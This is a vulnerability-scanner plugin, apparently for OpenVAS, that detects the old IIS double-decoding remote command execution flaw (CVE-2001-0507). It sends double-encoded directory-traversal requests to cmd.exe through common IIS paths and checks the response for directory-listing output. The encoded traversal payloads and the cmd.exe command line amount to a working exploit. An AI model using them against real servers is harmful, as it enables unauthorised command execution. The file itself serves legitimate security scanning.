if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10671" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_xref( name: "IAVA", value: "2001-a-0006" );
	script_bugtraq_id( 2708, 3193 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2001-0507", "CVE-2001-0333" );
	script_name( "IIS Remote Command Execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2001 Matt Moore / H D Moore" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IIS/banner" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-044" );
	script_tag( name: "solution", value: "See MS advisory MS01-026 (Superseded by ms01-044)." );
	script_tag( name: "summary", value: "When IIS receives a user request to run a script, it renders
  the request in a decoded canonical form, then performs security checks on the decoded request." );
	script_tag( name: "insight", value: "A vulnerability results because a second, superfluous decoding pass is
  performed after the initial security checks are completed. Thus, a specially crafted request could allow
  an attacker to execute arbitrary commands on the IIS Server." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "IIS" )){
	exit( 0 );
}
dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";
dir[4] = "/_mem_bin/";
dir[5] = "/exchange/";
dir[6] = "/pbserver/";
dir[7] = "/rpc/";
dir[8] = "/cgi-bin/";
dir[9] = "/";
uni[0] = "%255c";
dots[0] = "..";
uni[1] = "%%35c";
dots[1] = "..";
uni[2] = "%%35%63";
dots[2] = "..";
uni[3] = "%25%35%63";
dots[3] = "..";
uni[4] = "%252e";
dots[4] = "/.";
func check( url ){
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		return ( 0 );
	}
	pat = "<DIR>";
	pat2 = "Directory of C";
	if(( ContainsString( res, pat ) ) || ( ContainsString( res, pat2 ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		return ( 1 );
	}
	return ( 0 );
}
cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\\\+/OG";
for(d = 0;dir[d];d++){
	for(i = 0;uni[i];i++){
		url = NASLString( dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], cmd );
		if(check( url: url )){
			exit( 0 );
		}
	}
}
for(d = 0;dir[d];d++){
	for(i = 0;uni[i];i++){
		url = NASLString( dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], cmd );
		if(check( url: url )){
			exit( 0 );
		}
	}
}
exit( 99 );

